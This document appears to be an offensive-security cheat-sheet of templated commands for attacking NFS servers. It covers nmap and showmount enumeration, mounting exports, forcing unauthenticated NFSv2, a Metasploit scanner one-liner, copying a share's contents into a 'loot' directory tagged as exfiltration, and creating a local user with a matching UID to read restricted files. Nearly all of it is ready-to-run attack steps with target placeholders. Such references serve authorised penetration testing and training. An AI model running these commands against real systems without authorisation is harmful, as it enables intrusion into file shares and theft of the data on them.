# NFS
> Network File System enumeration, mounting, and exploitation
<!-- tags: nfs,filesystem,share,enumeration -->

---

## Nmap NFS Script Scan
Enumerate NFS exports, stats, and ACLs.

```bash
nmap -p 2049 --script "nfs-ls,nfs-statfs,nfs-showmount" {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=recon | tags=nfs,nmap,enum -->

---

## Show Available NFS Exports
List exported shares from NFS server.

```bash
showmount -e {{TARGET:ip}}
```

<!-- meta: risk=safe | phase=recon | tags=nfs,showmount,exports -->

---

## Mount NFS Share
Mount remote NFS share on local mount point.

```bash
sudo mount -t nfs {{TARGET:ip}}:{{REMOTE_PATH:str:/share}} {{MOUNT_POINT:dir:/mnt/nfs}} -o nolock
```

<!-- meta: risk=low | phase=enum | tags=nfs,mount -->

---

## Mount NFSv2 (No Authentication)
Force NFSv2 (no auth) when possible.

```bash
sudo mount -t nfs -o vers=2 {{TARGET:ip}}:{{REMOTE_PATH:str:/share}} {{MOUNT_POINT:dir:/mnt/nfs}} -o nolock
```

<!-- meta: risk=med | phase=enum | tags=nfs,nfsv2,unauth -->

---

## Unmount NFS Share
Force lazy unmount of NFS share.

```bash
sudo umount -lf {{MOUNT_POINT:dir:/mnt/nfs}}
```

<!-- meta: risk=safe | phase=misc | tags=nfs,umount -->

---

## Recursive Copy of Mounted NFS
Pull all data from mount for offline review.

```bash
cp -r {{MOUNT_POINT:dir:/mnt/nfs}}/ {{LOOT_DIR:dir:./nfs-loot}}
```

<!-- meta: risk=med | phase=post | tags=nfs,exfil,loot -->

---

## Metasploit - NFS Mount Scanner
Use Metasploit auxiliary scanner for NFS hosts.

```bash
msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; set RHOSTS {{TARGET:ip}}; run; exit"
```

<!-- meta: risk=safe | phase=recon | tags=nfs,metasploit,scanner -->

---

## Spoof UID for File Access
Create a local user matching remote UID for file access via no_root_squash bypass.

```bash
sudo useradd -u {{UID:int:1000}} {{USERNAME:str:nfsuser}}
sudo su - {{USERNAME:str:nfsuser}}
ls -la {{MOUNT_POINT:dir:/mnt/nfs}}/restricted
```

<!-- meta: risk=med | phase=exploit | tags=nfs,uid,spoof,privesc -->
